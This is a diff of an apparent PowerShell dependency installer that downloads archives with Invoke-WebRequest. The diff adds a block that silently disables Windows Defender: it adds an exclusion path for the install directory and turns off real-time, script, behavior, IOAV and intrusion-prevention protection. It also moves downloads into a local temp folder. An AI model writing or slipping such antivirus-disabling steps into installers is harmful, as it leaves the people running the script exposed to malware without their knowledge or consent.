@@ -51,6 +51,18 @@ Write-Output "Done"
 Log "Done"
 Write-Output ""
 
+Write-Output "Disabling Windows Defender..."
+Log "Disabling Windows Defender..."
+Add-MpPreference -ExclusionPath $directory
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+Write-Output "Done"
+Log "Done"
+Write-Output ""
+
 Write-Output "Checking dependencies..."
 Log "Checking dependencies..."
 Write-Output ""
@@ -118,7 +130,8 @@ foreach ($dep in $dependencies) {
     # $ProgressPreference = "SilentlyContinue"    # Hides progress bar, but speeds up downloads
     Write-Output "Downloading $name..."
     Log "Downloading $name..."
-    $outputPath = "$env:TEMP\$($name -replace ' ', '')-download.zip"
+    New-Item -Path "temp" -ItemType Directory -ErrorAction SilentlyContinue >> $logFile
+    $outputPath = "temp\$($name -replace ' ', '')-download.zip"
     Invoke-WebRequest -Uri $url -OutFile $outputPath -Headers $headers
 
     if ($name -eq "7zip") {
